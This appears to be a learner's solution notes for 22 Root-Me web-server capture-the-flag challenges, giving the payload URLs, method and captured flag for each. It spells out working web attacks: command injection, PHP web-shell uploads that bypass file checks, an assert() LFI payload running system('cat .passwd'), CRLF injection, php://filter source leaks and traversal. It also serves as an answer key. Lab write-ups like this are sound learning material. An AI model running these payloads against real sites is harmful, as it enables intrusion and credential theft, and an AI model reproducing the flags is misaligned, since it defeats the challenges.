1. HTML: View Source 
	>>> nZ^&@q5&sjJHev0


2. HTTP - Open redirect: lv2: use burpsuite to intercrept: 
http://challenge01.root-me.org/web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134
change into: http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f 	<h = MD5(https://)>
	>>>e6f8a530811d5a479812d7b82fc1a5c5

3. Command injection - Ping service v1: use command: grep flag index.php
	>>>$flag = "S3rv1ceP1n9Sup3rS3cure"



4. Weak password : user & pw = admin (bruzzforce)
	>>>admin


5. User-agent: change user-agent header = admin
	>>>rr$Li9%L34qd1AAe27


6. Backup file: change url : http://challenge01.root-me.org/web-serveur/ch11/index.php~
	download index.php_ >>see user and pw
	>>>OCCY9AcNm1tj


7. HTTP directory indexing: ctrl + U>> add path admin/pass.html in url >>> /admin/ >>pass.txt
	>>>LINUX


8. HTTP Headers: use burp to add Header-RootMe-Admin = 1 to http headers
	>>>HeadersMayBeUseful



9. HTTP verb tampering: USE Burp: change method GET> OPTIONS:
	>>>a23e$dme96d3saez$$prap


10. Install file: enter link: http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php
	>>>karambar



11. Improper redirect: US burp: GET /web-serveur/ch32/
	>>>ExecutionAfterRedirectIsBad


12. CRLF: change URL: http://challenge01.root-me.org/web-serveur/ch14/?username=admin%20authenticated.%0d%0aadmin&password=admin%20authenticated.%0d%0aadmin
	>>>rFSP&G0p&5uAg1%


13. File upload - double extensions: creat a shell.php allow inject command in url, change name to shell.php.png(or other ext) then upload it. 	
	****ADD Command: ?command=<command>
		get flag: ?command=cat../../../.passwd (i use burp to change value of command)
	>>>Gg9LRz-hWSxqqUKd77-_q-6G8


14. File upload - MIME type: use burp: the chall is only allow you to upload image file
		try up a shell.php file and see burp: <FU_1>
		It will check your file before upload  <content-type>
		use burp and change content-type to: image/jpeg >>>File uploaded <FU_2>
		get flag: ?command=cat ../../../.passwd <FU_FLAG>
	>>>a7n4nizpgQgnPERy89uanf6T4


15. HTTP cookies: use edit this cookie to change value cookie : admin and F5
	>>>ml-SYMPA


16.	Directory traversal: http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie
						 http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r
						 http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt
	>>>kcb$!Bx@v4Gs9Ez

17. File upload - null byte: creat a shell php file and change it name to: shell.php%00.png>> file will be uploaded
			Get flag: http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/7fnmajn87bmh2so0494vfnuoh0/shell.php?command=%20../../../.passwd
	>>>YPNchi2NmTwygr2dgCCF

18.	LFI PHP assert(): PAYLOAD 
					http://challenge01.root-me.org/web-serveur/ch47/?page=','..')==false and system('cat .passwd') and strpos('
	>>>x4Ss3rT1nglSn0ts4f3A7A1Lx



19.	PHP filters: Get source by base64 encode with php://filter: 
					http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=ch12.php 
				decode the resulf (in ch12.php) >> u will config.php >> do it again 
					http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php >> decode(config_ch12.php) >>> get flag
	>>>DAPt9D2mky0APAF

20. PHP register globals: dowwnload backup index.php :challenge01.root-me.org/web-serveur/ch17/index.php.bak
		You can see the if code :
		<
				if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
    				$aff=display("well done, you can validate with the password : $hidden_password");>

   			 So. there are 2 ways to get flag:
    			1. Set $_SESSION["logged"]==1:
    				Link: http://challenge01.root-me.org/web-serveur/ch17/?_SESSION[logged]=1
    			2. Use burp to add password=1&hidden_password=1 >>Go   
    				Then delete it and go again <image ch17_1 and ch17_2>
    >>>NoTQYipcRKkgrqG




21.	Local File Inclusion-Abbreviated LFI:	http://challenge01.root-me.org/web-serveur/ch16/?files=../
											http://challenge01.root-me.org/web-serveur/ch16/?files=../admin&f=index.php
	>>>$realm = 'PHP Restricted area';
	   $users = array('admin' => 'OpbNJ60xYpvAQU8');


22. Local File Inclusion - Double encoding: use php filter and double encode (url encode)
					http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php://filter/convert.base64-encode/resource=home
	 double -encode: http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252f%252ffilter%252fconvert%252ebase64-encode%252fresource%253Dhome
			Base-64 -deoce resulf: <?php include("conf.inc.php"); ?>....

					http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php://filter/convert.base64-encode/resource=conf
	 double-encode: http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252f%252ffilter%252fconvert%252ebase64-encode%252fresource%253Dconf
			Base-64 -decode resufl:	    "flag"        => "Th1sIsTh3Fl4g!",
	>>>Th1sIsTh3Fl4g!
	Note: "." double url decode: %252E
		  "/" double url decode: %252F
		  fuking méo để ý .








